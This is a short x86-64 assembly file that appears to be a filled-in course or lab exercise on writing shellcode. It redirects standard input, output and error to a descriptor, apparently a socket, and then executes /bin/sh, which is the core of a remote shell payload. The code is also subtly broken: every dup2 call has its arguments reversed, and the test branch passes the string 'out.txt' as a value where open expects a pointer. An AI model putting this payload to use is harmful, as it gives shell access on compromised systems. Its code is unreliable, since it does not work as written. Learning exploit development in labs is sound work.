bits 64

global _start

; these constants are taken from /usr/include/x86_64-linux-gnu/asm/unistd_64.h
%define open_syscall_no       0x02
%define dup2_syscall_no       0x21
%define execve_syscall_no     0x3b

; these constants are taken from /usr/include/x86_64-linux-gnu/bits/fcntl.h
%define O_WRONLY 0x1
%define O_CREAT 0o0100
%define O_TRUNC 0o01000

; these constants are taken from /usr/include/x86_64-linux-gnu/sys/stat.h and /usr/include/x86_64-linux-gnu/bits/stat.h
%define S_IRUSR 0o00400
%define S_IWUSR 0o00200

_start:
%ifdef TEST_MODE
	
	%define file_descriptor 0x3

	; call open()
	; your code here
	
	mov rax, open_syscall_no
	mov rdi , "out.txt"
	mov rsi, O_WRONLY |  O_CREAT | O_TRUNC
	mov rdx, S_IRUSR | S_IWUSR
	syscall
	
%else

	%define file_descriptor 0x4
	
	; call dup2() for stdin
	; your code here
	
	mov rax, dup2_syscall_no
    mov rdi, 0
    mov rsi, file_descriptor
    syscall

%endif

; call dup2() for stdout and stderr, then call execve()
; your code here

; stdout
mov rax, dup2_syscall_no
mov rdi, 1
mov rsi, file_descriptor
syscall

; stderr
mov rax, dup2_syscall_no  
mov rdi, 2
mov rsi, file_descriptor
syscall

; execve 
mov rax, execve_syscall_no
mov rdx, 0
mov rsi, 0

mov rdi, "/bin/sh"
push rdi
mov rdi, rsp


syscall


